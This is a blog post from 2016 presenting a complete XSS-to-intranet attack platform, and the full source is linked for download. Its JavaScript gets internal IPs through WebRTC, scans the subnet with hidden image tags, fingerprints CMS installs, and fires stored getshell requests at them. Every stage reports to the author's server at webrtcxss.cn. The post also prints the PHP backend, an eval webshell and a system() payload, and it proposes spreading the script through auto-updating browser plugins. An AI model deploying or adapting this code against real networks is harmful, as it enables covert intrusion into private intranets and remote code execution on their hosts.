---
title: Automated XSS intranet invasion
description: Probe and break into the intranet with WebRTC
date: 2016-12-14T22:40:25+08:00
tags:
  - web security
  - xss
translationKey: use-xss-automation-invade-intranet
---

## 0x01 Preface

A lot of people think XSS can only steal cookies. Some SRCs and vendors ignore reflected XSS, or simply do not take it seriously.

Things only started to change after "Hei Ge" mentioned XSS intranet invasion in an earlier talk. From my own testing, the XSS intranet invasion Hei Ge described likely involved a browser vulnerability. What if you do not have a browser vulnerability? Like the Sohu bug 0x_Jin reported on WooYun: <http://www.wooyun.org/bugs/wooyun-2014-076685>

A few things to note: because of the browser same-origin policy, you cannot really invade the intranet in the full sense of the word. Of course, if you have a browser 0day, that is a different story.

I also asked about 0x_Jin's WooYun report myself. The answer was that it only probed open port 80, and that was it. Hei Ge did not publish the full code, and 0x_Jin did not go further. Since neither did, I will take it from here. I will use another approach to "bypass the browser same-origin policy".

## 0x02 Architecture

The code uses a live-feedback mechanism similar to XSS platforms. I will go through the variables first:

```js
var onlyString           = "abc";
var ipList               = [];
var survivalIpLIst       = [];
var deathIpLIst          = [];
var sendsurvivalIp       = "http://webrtcxss.cn/Api/survivalIp";
var snedIteratesIpUrl    = "http://webrtcxss.cn/Api/survivalPortIp";
var snedIteratesCmsIpUrl = "http://webrtcxss.cn/Api/survivalCmsIp";
var sendExistenceVul     = "http://webrtcxss.cn/Api/existenceVul";
```

1. onlyString : a unique string so the server can tell which project a request belongs to. Real code would not hard-code `abc`; it would generate a hash with md5(date('Y-m-d H: i: s')).

2. ipList : array that stores intranet IPs obtained via WebRTC.

3. survivalIpLIst : array of IPs with port 80 open

4. deathIpLIst : array of IPs without port 80, used for the check

5. sendsurvivalIp : send the current intranet IP info to the server

6. snedIteratesIpUrl : take CMS paths returned by the server and test IPs that already have port 80 open, to see whether any live IP matches CMS info stored on the server
7. snedIteratesCmsIpUrl : for a matched CMS, ask the server whether that CMS has a getshell we stored
8. sendExistenceVul : vulnerability confirmed, send it to the server

As I said in the 0x01 preface, I will use another approach to "bypass the browser same-origin policy". Overall architecture: https://www.processon.com/view/link/5711cdc6e4b0d7e7748c34ec

## 0x03 Getting intranet IP information

See: https://webrtc.org/faq/#what-is-webrtc
WebRTC gives JavaScript some lower-level capabilities, and because of how WebRTC works, we can use JavaScript to obtain intranet IPs. Platforms that currently support WebRTC: Chrome, Firefox, Opera, Android, iOS. In my tests Maxthon also supports it (this will come up later).
The WebRTC intranet-IP snippet is easy to find online. I modified it here so the rest of the code can call it easily.
Here is the WebRTC code:

```js
var webrtcxss = {
    webrtc : function(callback){
        var ip_dups           = {};
        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        var mediaConstraints  = {
            optional: [{RtpDataChannels: true}]
        };
        var servers = undefined;
        if(window.webkitRTCPeerConnection){
            servers = {iceServers: []};
        }
        var pc = new RTCPeerConnection(servers, mediaConstraints);
        pc.onicecandidate = function(ice){
            if(ice.candidate){
                var ip_regex        = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1];
                if(ip_dups[ip_addr] === undefined)
                callback(ip_addr);
                ip_dups[ip_addr] = true;
            }
        };
        pc.createDataChannel("");
        pc.createOffer(function(result){
            pc.setLocalDescription(result, function(){});
        });
    },
    getIp : function(){
        this.webrtc(function(ip){
            ipList.push(ip);
        });
    }
}
webrtcxss.getIp();
```

Let's print it and see:

![](/images/use-xss-automation-invade-intranet/webrtc-local-ip.png)

I already have the current host's IP.

## 0x04 Detecting hosts on the intranet with port 80 open

At the end of the last section you can see `webrtcxss.getIp()`; has already called WebRTC to get intranet IPs, stored in the ipList array. Next we detect every IP on the intranet with port 80 open. I wrapped this step in a function:

```js
function iteratesIp(){
    stage(1)
    ipAjax = new XMLHttpRequest();
    ipAjax.open('POST', sendsurvivalIp, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('survivalip='+ ipList.join("-") + '&onlystring=' + onlyString);
    for(var i = 0;i < ipList.length;i++){
        incompleteIp = ipList[i].split(".");
        incompleteIp.pop();
        incompleteIp = incompleteIp.join(".");
        for(var j = 1;j < 255;j++){
            var ip = incompleteIp + "." + j;
            var imgTag = document.createElement("img");
            imgTag.setAttribute("src","http://" + ip + "/favicon.ico");
            imgTag.setAttribute("onerror","javascript:deathIpLIst.push('"+ip+"')");
            imgTag.setAttribute("onload","javascript:survivalIpLIst.push('"+ip+"')");
            imgTag.setAttribute("style","display:none;");
            document.getElementsByTagName("body")[0].appendChild(imgTag);
        }
    }
}
setTimeout("iteratesIp()",20000);
(function(){
    if(deathIpLIst.length + survivalIpLIst.length == 254){
        snedIteratesIpData(survivalIpLIst);
    }else{
        setTimeout(arguments.callee,5000);
    }
})();
```

`stage(1)` is a function I wrote to send the latest progress to the server in real time. I will cover it at the end.

```js
ipAjax = new XMLHttpRequest();
ipAjax.open('POST', sendsurvivalIp, false);
ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
ipAjax.send('survivalip='+ ipList.join("-") + '&onlystring=' + onlyString);
```

This sends the intranet IPs we just got to the server. The join("-") on ipList is there because WebRTC sometimes also picks up gateway and VM IPs.

```js
for(var i = 0;i < ipList.length;i++){
    incompleteIp = ipList[i].split(".");
    incompleteIp.pop();
    incompleteIp = incompleteIp.join(".");
    for(var j = 1;j < 255;j++){
        var ip = incompleteIp + "." + j;
        var imgTag = document.createElement("img");
        imgTag.setAttribute("src","http://" + ip + "/favicon.ico");
        imgTag.setAttribute("onerror","javascript:deathIpLIst.push('"+ip+"')");
        imgTag.setAttribute("onload","javascript:survivalIpLIst.push('"+ip+"')");
        imgTag.setAttribute("style","display:none;");
        document.getElementsByTagName("body")[0].appendChild(imgTag);
    }
}
```

This walks every intranet host on port 80. Let's look at it in practice:

![](/images/use-xss-automation-invade-intranet/subnet-prefix.png)

The trailing .104 is stripped. Then a for loop walks 192.168.1.1~192.168.1.254
Now let's run

```js
for(var i = 0;i < ipList.length;i++){
    incompleteIp = ipList[i].split(".");
    incompleteIp.pop();
    incompleteIp = incompleteIp.join(".");
    for(var j = 1;j < 255;j++){
        var ip = incompleteIp + "." + j;
        var imgTag = document.createElement("img");
        imgTag.setAttribute("src","http://" + ip + "/favicon.ico");
        imgTag.setAttribute("onerror","javascript:deathIpLIst.push('"+ip+"')");
        imgTag.setAttribute("onload","javascript:survivalIpLIst.push('"+ip+"')");
        imgTag.setAttribute("style","display:none;");
        document.getElementsByTagName("body")[0].appendChild(imgTag);
    }
}
```

this code:

![](/images/use-xss-automation-invade-intranet/favicon-scan-console.png)

That is the console. Let's see what changed in the DOM:

![](/images/use-xss-automation-invade-intranet/favicon-img-tags-dom.png)

I use `http://192.168.1.xxx/favicon.ico` to tell which intranet IPs have port 80 open and a site running.
`onerror="javascript:deathIpLIst.push('192.168.1.xxx')"` fires if the IP does not have port 80 open, or has port 80 open but no site, and pushes that IP into deathIpLIst. If it exists, it is pushed into survivalIpLIst, i.e. `onload="javascript:survivalIpLIst.push('192.168.1.1')"`.
Why do it this way? Here is the catch. The browser does not tell you immediately which images loaded and which did not; it needs a buffer period. Checking whether favicon.ico exists on 254 hosts in the same subnet takes about 550000ms===550s, roughly 2.16535s/IP. That is a bit over 9.16 minutes. So you wait about 9.16 minutes for the full scan. There is nothing you can do about that.
Why `setTimeout("iteratesIp()",20000);` with a 20-second delay? WebRTC needs some time to get IPs. A few seconds would actually be enough. I bumped it to 20 seconds for a higher fault-tolerance margin. If that feels slow, download the source at the end of the article and change it.
There is also this:

```js
(function(){
    if(deathIpLIst.length + survivalIpLIst.length == 254){
        snedIteratesIpData(survivalIpLIst);
    }else{
        setTimeout(arguments.callee,5000);
    }
})();
```

That is why I put IPs without port 80 in one array and IPs with port 80 in another. I do not know when they will finish. The 9.1 minutes earlier is only a rough figure; machine specs, intranet speed, and other factors can make it faster or slower. I cannot guarantee it. So I wrote this. Here is what it means:

```js
(function(){
    /*coding*/
})();
```

This is an anonymous function. It runs as soon as execution reaches it.
Inside, it first checks whether deathIpLIst.length + survivalIpLIst.length equals 254. If so, it calls snedIteratesIpData and passes the IPs that have port 80 open with a site running. If not, the browser has not finished judging every image yet, and it goes into the else branch.
`setTimeout(arguments.callee,5000);` delays 5 seconds and then runs arguments.callee. arguments.callee is the current function. Let's look:

![](/images/use-xss-automation-invade-intranet/arguments-callee-log.png)

console.log printed the current function. You can also write setTimeout(currentFunctionName(), 5000); to get the same effect, but that does not work for an anonymous function, because it has no name. If you have learned recursion, this should be easy to follow.
In plain terms: run this function every 5 seconds until every img tag has been judged, then go to the next step.

## 0x05 Identifying CMS on live intranet hosts

The previous section mentioned snedIteratesIpData, which the if in the closure calls when the condition is true. Here is what is inside that function:

```js
function snedIteratesIpData(ip){
    if(deathIpLIst.length == 254){
        return false;
    }
    stage(2)
    ip = ip.join("-")
    ipAjax = new XMLHttpRequest();
    ipAjax.onreadystatechange = function(){
        if(ipAjax.readyState == 4 && ipAjax.status == 200){
            var cmsPath = JSON.parse(ipAjax.responseText).path;
            for(var key in cmsPath){
                for(var i = 0;i < survivalIpLIst.length;i++){
                    var scriptTag = document.createElement("script");
                    scriptTag.setAttribute("src","http://" + survivalIpLIst[i] + cmsPath[key]);
                    scriptTag.setAttribute("data-ipadder",survivalIpLIst[i]);
                    scriptTag.setAttribute("data-cmsinfo",key);
                    scriptTag.setAttribute("onload","javascript:vulnerabilityIpList(this)");
                    document.getElementsByTagName("body")[0].appendChild(scriptTag);
                }
            }
        }
    }
    ipAjax.open('POST', snedIteratesIpUrl, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('iplist='+ip+'&onlystring='+onlyString);
}
```

Why is there an if at the start of the function? Because the closure in the previous section has a bug: if no intranet IP has port 80 open and a site running, deathIpLIst.length is 254 and survivalIpLIst.length is 0. Then `deathIpLIst.length + survivalIpLIst.length == 254` is still true. To avoid that, we add this in snedIteratesIpData:

```js
if(deathIpLIst.length == 254){
    return false;
}
```

When deathIpLIst.length is 254, return false and stop. The architecture is A calls B, C calls A, D calls C. When C returns false, D does not run. After the return false, none of the code below it runs.
What `ip = ip.join("-")` means: when there are two or more intranet IPs, join them before sending so the server can receive and display them. The server feedback looks like this:

![](/images/use-xss-automation-invade-intranet/vuln-detail-open-ports.png)

Next, the ajax request:

```js
ipAjax = new XMLHttpRequest();
ipAjax.onreadystatechange = function(){
    if(ipAjax.readyState == 4 && ipAjax.status == 200){
        var cmsPath = JSON.parse(ipAjax.responseText).path;
        for(var key in cmsPath){
            for(var i = 0;i < survivalIpLIst.length;i++){
                var scriptTag = document.createElement("script");
                scriptTag.setAttribute("src","http://" + survivalIpLIst[i] + cmsPath[key]);
                scriptTag.setAttribute("data-ipadder",survivalIpLIst[i]);
                scriptTag.setAttribute("data-cmsinfo",key);
                scriptTag.setAttribute("onload","javascript:vulnerabilityIpList(this)");
                document.getElementsByTagName("body")[0].appendChild(scriptTag);
            }
        }
    }
}
ipAjax.open('POST', snedIteratesIpUrl, false);
ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
ipAjax.send('iplist='+ip+'&onlystring='+onlyString);
```

Send the intranet IPs that have port 80 open and a site running, plus the unique identifier, for the server to verify.
After the server accepts that, it sends JSON. Server code:

```php
$this->ajaxReturn(array(
    "typeMsg" => "success",
    "path"    => $pathInfo,
));
```

Then `if(ipAjax.readyState == 4 && ipAjax.status == 200)` checks whether the send succeeded. On success, assign the JSON path data to cmsPath for later use. First a for loop, where cmsPath['key'] is the current CMS path. Nested inside that, another for loop, where survivalIpLIst[i] is the current IP.
Then we create a script DOM element. data-ipadder and data-cmsinfo are there so later code can read them. `onload = " javascript:vulnerabilityIpList(this)"` is the function called when that URL exists. Next section covers it.
First, let's see what cmsPath looks like in the database:

![](/images/use-xss-automation-invade-intranet/cmspath-db-table.png)

These four are the defaults. You can add more paths yourself.
For testing I deployed some code on another computer at home, with only index.php, /static/bbcode.js, vul/heihei.php, and favicon.ico. The code in heihei.php is:

```php
<?php
   eval($_GET['a']);
```

Why this? Simple. I do not have a Discuz getshell on hand. This was the lazy way. I also casually used a dedecms favicon.ico. Don't mind that in the tests below.
Let's run the code and see what happens:

![](/images/use-xss-automation-invade-intranet/cms-js-probe-console.png)

I put console.log(1) in /static/bbcode.js, so the console prints 1. That is only test code; a real environment would not look like this. Now look at the DOM changes:

![](/images/use-xss-automation-invade-intranet/cms-script-tags-dom.png)

It already ran. The program detected that only http://192.168.1.103/static/js/bbcode.js matched. Once the JS file loads successfully, the vulnerabilityIpList(this) in onload runs. The vulnerabilityIpList function is in the next section.

## 0x06 Checking whether intranet host vulnerabilities actually exist (part 1)

Here is the vulnerabilityIpList function:

```js
function vulnerabilityIpList(info){
    stage(3)
    ipAjax = new XMLHttpRequest();
    ipAjax.onreadystatechange = function(){
        if(ipAjax.readyState == 4 && ipAjax.status == 200){
            var vulCmsInfo = ipAjax.responseText;
            var img = document.createElement("img");
            img.setAttribute("scr",vulCmsInfo);
            img.setAttribute("style","display:none;");
            document.getElementsByTagName("body")[0].appendChild(img);
            setTimeout(function(){
                var scriptTag = document.createElement("script");
                scriptTag.setAttribute("src","http://"+info.getAttribute('data-ipadder')+"/1.js");
                scriptTag.setAttribute("data-cmsinfo",info.getAttribute("data-cmsinfo"));
                scriptTag.setAttribute("data-vulip",info.getAttribute('data-ipadder'));
                scriptTag.setAttribute("onload","javascript:vulConfirm(this)");
                document.getElementsByTagName("body")[0].appendChild(scriptTag);
            },2000);
        }
    }
    ipAjax.open('POST', snedIteratesCmsIpUrl, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('existenceCmsIp='+ info.getAttribute("data-ipadder") + '&existenceCmsInfo=' + info.getAttribute("data-cmsinfo") + '&onlystring=' + onlyString);
}
```

The info argument is the DOM object of the script tag that loaded successfully.
First, the request URL:

1. existenceCmsIp is the IP whose CMS type was detected

2. existenceCmsInfo is the CMS type that was detected

3. onlystring is the unique identifier, so the server can tell which project this belongs to.

Next, what is inside onreadystatechange:

```js
var vulCmsInfo = ipAjax.responseText;
var img = document.createElement("img");
img.setAttribute("scr",vulCmsInfo);
img.setAttribute("style","display:none;");
document.getElementsByTagName("body")[0].appendChild(img);
setTimeout(function(){
    var scriptTag = document.createElement("script");
    scriptTag.setAttribute("src","http://"+info.getAttribute('data-ipadder')+"/1.js");
    scriptTag.setAttribute("data-cmsinfo",info.getAttribute("data-cmsinfo"));
    scriptTag.setAttribute("data-vulip",info.getAttribute('data-ipadder'));
    scriptTag.setAttribute("onload","javascript:vulConfirm(this)");
    document.getElementsByTagName("body")[0].appendChild(scriptTag);
},2000);
```

First, `var vulCmsInfo = ipAjax.responseText;` assigns the string the server returned to vulCmsInfo. The server code is:

```php
/*
* add IPs where the client detected a CMS to the database
*/
if(I('post.existenceCmsIp')  == "" || I('post.existenceCmsInfo') == "" || I('post.onlystring') == ""){
    $this->ajaxReturn(array(
        "typeMsg" => "error",
    ));
}
$existenceCmsIp               = I('post.existenceCmsIp');
$existenceCmsInfo             = I('post.existenceCmsInfo');
$onlyString                   = I('post.onlystring');
$existencecmsip               = M('existencecmsip');
$existenceData['inner_ip']    = $existenceCmsIp;
$existenceData['cms']         = $existenceCmsInfo;
$existenceData['onlystring'] = $onlyString;
$existenceData['create_time'] = date('Y-m-d H:i:s');
$existencecmsip->data($existenceData)->add();
/*
* fetch CMS vulnerability details from the database and send them to the client
*/
$cmsvul  = M('cmsvul');
$vulInfo = base64_decode($cmsvul->where('cms="'.$existenceCmsInfo.'"')->getField("vulinfo"));
echo "http://".$existenceCmsIp.$vulInfo;
```

From the code you can see the server does not return JSON, it returns a string. That string is a concatenated URL. The URL is the discovered IP plus the CMS vulnerability path stored on the server.
Then an img tag sends a GET to trigger the getshell. The code is:

```js
var img = document.createElement("img");
img.setAttribute("scr",vulCmsInfo);
img.setAttribute("style","display:none;");
document.getElementsByTagName("body")[0].appendChild(img);
```

Why delay 2 seconds with setTimeout? As I said earlier, the browser cannot judge that many img requests at once. There is only one here, so I used 2 seconds. In a real case you can change it to 20 seconds.
Then we create a script tag to check whether 1.js was generated. If it was, the vulnerability exists and we hand it to the next function. If not, we stop, because onload will not call vulConfirm.
Why check for 1.js? That is the getshell payload I mentioned. In the database it looks like this:

![](/images/use-xss-automation-invade-intranet/cmsvul-base64-table.png)

It is a base64 ciphertext. Decoded, it is: `/vul/heihei.php?a=system('echo 1 >> ../1.js');`
When the backend sends this to the frontend, I have already decoded it, as in the code above:
`$vulInfo = base64_decode($cmsvul->where('cms="'.$existenceCmsInfo.'"')->getField("vulinfo"));`
In the browser the code looks like this:

![](/images/use-xss-automation-invade-intranet/getshell-payload-dom.png)

Now the real use of setTimeout. Look at this line:
`scriptTag.setAttribute("src","http://"+info.getAttribute('data-ipadder')+"/1.js");`
The script src is set to check whether 1.js exists on the target. If it does, vulConfirm in onload runs. vulConfirm is in the next section.

## 0x07 Checking whether intranet host vulnerabilities actually exist (part 2)

vulConfirm is simple. It only sends data to the server.

```js
function vulConfirm(cmsConfirmInfo){
    stage(4)
    ipAjax = new XMLHttpRequest();
    ipAjax.open('POST', sendExistenceVul, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('cms='+ cmsConfirmInfo.getAttribute("data-cmsinfo") + '&vulip='+ cmsConfirmInfo.getAttribute("data-vulip") +'&onlystring=' + onlyString);
}
```

1. cms is the CMS that has the vulnerability
2. vulip is the IP that has the vulnerability
3. onlystring is the unique identifier, so the server can tell which project this belongs to

## 0x08 What stage does

The stage function:

```js
function stage(num){
    var updataStage = document.createElement("img");
    updataStage.setAttribute("src","http://webrtcxss.cn/Api/stage/onlystring/"+onlyString+"/updata/"+num);
    updataStage.setAttribute("style","display:none;");
    document.getElementsByTagName("body")[0].appendChild(updataStage);
}
```

It is just an img tag that GETs the server to report how far the code has run. Feedback on the platform looks like this:

![](/images/use-xss-automation-invade-intranet/stage-feedback-list.png)

## 0x09 API backend code

The backend uses the ThinkPHP framework. If you want to change how the server receives data, edit ApiController.class.php under /Application/Home/Controller. It is split into the survivalIp, survivalPortIp, _empty, survivalCmsIp, existenceVul, and stage modules. Adjust them to match the JavaScript. Screenshot:

![](/images/use-xss-automation-invade-intranet/api-controller-code.png)

## 0x10 Platform-specific APIs

The platform API is RootApiController.class.php under `/Application/Home/Controller`.
Creating, deleting, and querying projects are all in there. If you want to change the JavaScript, do it in project creation, as in:

![](/images/use-xss-automation-invade-intranet/add-project-code.png)

The change is simple.
The running platform looks like this:

![](/images/use-xss-automation-invade-intranet/project-list.png)

![](/images/use-xss-automation-invade-intranet/add-project-modal.png)

![](/images/use-xss-automation-invade-intranet/project-success-script.png)

![](/images/use-xss-automation-invade-intranet/vuln-detail-modal.png)

![](/images/use-xss-automation-invade-intranet/no-projects-page.png)

## 0x11 Database schema

There are 7 tables in total:

1. `webrtc_cmspath` stores JavaScript paths used to detect CMS type
2. `webrtc_cmsvul` stores getshell details for each CMS
3. `webrtc_existencecmsip` stores which intranet IPs have a CMS
4. `webrtc_existencevul` stores which intranet IPs have a vulnerable CMS
5. `webrtc_ipdatalist` stores the list of intranet IPs that have port 80 open and a site running
6. `webrtc_project` stores project info
7. `webrtc_survivaliplist` stores the current host's intranet IPs

## 0x12 Other attack vectors

I wrote about this on FreeBuf earlier: <http://www.freebuf.com/articles/web/61268.html>
Some nginx or Apache admins watch site traffic in real time from the logs. Raw log files look ugly, so people built web UIs that stream traffic live. When they record user-agent and other packet fields, they do not filter. An attacker can set their user-agent to an XSS string, browse the site, and the admin triggers XSS when they open the viewer. Combined with what this chapter covers, it is as perfect as eating chocolate on a rainy day. It does not have to be nginx or Apache. Some site backends log IP and user-agent in application code rather than from nginx-style config files, so staff can view them in the admin panel. That is where the technique in this chapter comes in.
On plugin security, look at this:

![](/images/use-xss-automation-invade-intranet/maxthon-plugins-dashboard.png)

I controlled more than ten Maxthon plugin-author accounts, covering 300,000 plugin users, and I can change the code at any time. I asked Maxthon plugin staff, and the reply was:

![](/images/use-xss-automation-invade-intranet/plugin-autoupdate-reply.png)

Even if you do not have a plugin-author account, you can write a tiny plugin game with the simplest html+swf and get thousands of installs in a week. Say 100,000 users installed my plugin.
Of those, 50,000 already have jobs. 20,000 use Maxthon on a company computer with the plugin installed. Once they open Maxthon, the plugin runs automatically. When the plugin finds a new version, it silently auto-updates. Then our JavaScript runs. In 0x03 I said Maxthon also supports WebRTC, but there is a catch. I am not sure if it is version-related. In Chrome, the WebRTC code shows one set of IPs, the current machine's intranet IPs. In Maxthon you get three sets, maybe more. Screenshot:

![](/images/use-xss-automation-invade-intranet/maxthon-multiple-ips.png)

192.168.27.1 is a VM range on my machine. 192.168.118.1 is also a VM range. Only 192.168.1.104 is the real intranet IP. That is why the source uses join and a for loop over ipList.

## 0x13 Failed ideas

**Idea 1**

Suppose the intranet IP we got is 192.168.21.104. A for loop emitting img and script tags can get every live intranet IP (and can probe ports). The problem is how JavaScript gets resources from other intranet hosts. Cross-origin, so ajax and iframe both fail. I asked 0xJin last night: he did not fetch those resources, he only scanned live IPs and ports. But this is supposed to be intranet roaming, not just the PC that triggered the XSS. I looked through material all night and have an idea, though I don't know if it works. If you have a better suggestion, say so. The idea may be wrong.

Skip the earlier part. Assume we already have the intranet IPs with port 80 open.
Since ajax and iframe both fail, we can try Flash. Flash has its own crossdomain.xml restriction, but this morning I found this article: <http://www.litefeel.com/cross-flash-security-sandbox-get-visual-data>
According to the author, this method can only get visual objects (images, swf), so you still cannot get HTML source from the live IPs.

I wondered whether Flash could send a URL with XSS (an intranet IP)
The XSS would load the Html2canvas plugin, screenshot the live IP's site, and send it to our server.
There is a constraint: you still need the CMS of the live IP's site (you can use `<img src="intranet-ip/favicon.ico">` and send the image to a remote server to receive it. That tells you the CMS type. When you build this, you can add JavaScript that periodically fetches from the remote server. Once we see the CMS type, we look up a version-disclosure method, write it into code, and wait for the client's scheduled task to pick it up).

Now we have the info. There is still one more condition: an XSS to load the Html2canvas plugin, save a screenshot, and send it to the remote server.

Here is the problem: reflected XSS does not actually open the site, it just sends a GET. Then canvas will not load, so the screenshot fails. Stored XSS might work.

Why it failed:

1. canvas cannot read the DOM inside an iframe

2. the img cannot be sent to a remote server, because the current page and the img are not same-origin

3. stealth is poor

**Idea 2**

The idea I mentioned earlier was xss+iframe+canvas, but @超威蓝猫 said canvas cannot capture iframe content. I looked it up later and that is correct (weak fundamentals). Then I had another idea: use `<img src="https://xxx.xxx.xxx.xxx/favico.ico" />` to get the site's CMS, because different CMSs have different ico files. Send the img to the server and you can tell which CMS it is. After a few hours of discussion with Weige @呆子不开口, we realized I had skipped an important problem: how to send the img to a remote server. The image URL is not same-origin, and how do you turn the image into binary data in JavaScript? That idea died too. Weige offered a nice solution: probe JS files, i.e. `<script src="http://xxx.xxx.xxx.xxx/path/cms.js" onload="xxx(this)"></script>`. That means I need a large set of CMS-specific JS paths. A lot of work. I was going to go with that, but a few days ago I was bored and scrolling my QQ logs and found this:

```js
document.addEventListener("visibilitychange", function() {
    document.title = document.hidden ? 'iloveyou' : 'metoo';
});
```

This is an HTML5 API. I realized I could use it to upload images without the user noticing. When the user switches to another tab, document.hidden is true. Then we know the user is not looking at the XSS page. We can do anything and they will not notice. Roughly:

```js
document.addEventListener("visibilitychange", function() {
    if(document.hidden){
        var htmlText = $("body").html();
        $("body").empty();
        $("body").append("<img src='http://xxx.xxx.xxx.xxx/favico.ico' />");
        // canvas captures the page; see: http://leobluewing.iteye.com/blog/2020145
    }else{
        $("body").empty();
        $("body").append(htmlText);
    }
});
```

Why it failed:

2. As mentioned earlier, img loading is slow. On Maxthon especially, scanning three or more IP ranges takes about 30 minutes. This method would require the user not to open the page for half an hour

3. canvas cannot read cross-origin images, so it cannot read the image the img tag loaded

In the end I went with Weige's method.

## 0x14 Closing

Special thanks to @呆子不开口. This article was exhausting to write. Because img requests take so long, every bug fix meant waiting 9-10 minutes. It is the longest article I have written so far. I was also learning to drive, so I had even less time. It took about a month. I had promised the editor the 15th and kept slipping. Sorry about that. There are still some frontend, backend, and database bugs. If this platform hits 1,000 installs I will keep updating it. Download URL:
<https://github.com/BlackHole1/WebRtcXSS>
